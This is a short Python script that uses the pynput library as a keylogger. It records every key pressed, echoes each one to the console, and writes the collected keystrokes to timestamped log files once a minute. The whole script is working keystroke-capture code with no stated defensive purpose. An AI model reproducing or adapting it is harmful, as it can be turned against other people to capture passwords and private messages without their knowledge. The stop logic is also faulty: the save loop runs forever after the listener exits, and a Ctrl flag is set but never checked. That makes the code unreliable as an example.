import pynput
from pynput.keyboard import Key, Listener, KeyCode
import time
import datetime

keys = []

def on_press(key):
    keys.append(key)

    try:
        print('Alphanumeric key {0} pressed'.format(key.char))
    except AttributeError:
        print('Special key {0} pressed'.format(key))

def save_file():
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    filename = f"log_{timestamp}.txt"
    with open(filename, 'w') as f:
        f.write(''.join(str(key) for key in keys))

def start_listener():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        save_file()  # Save the file immediately upon starting the listener
        while True:
            time.sleep(60)  # Wait for 60 seconds
            save_file()     # Save the file again after 60 seconds

def on_release(key):
    if key == Key.ctrl_l or key == Key.ctrl_r:
        on_release.ctrl_pressed = False
    if key == KeyCode(char='o') and any(k == KeyCode(char='o') for k in keys) and any(k == Key.ctrl_l or k == Key.ctrl_r for k in keys):
        save_file()
        return False
    if key == Key.ctrl_l or key == Key.ctrl_r:
        on_release.ctrl_pressed = True

on_release.ctrl_pressed = False

if __name__ == "__main__":
    start_listener()
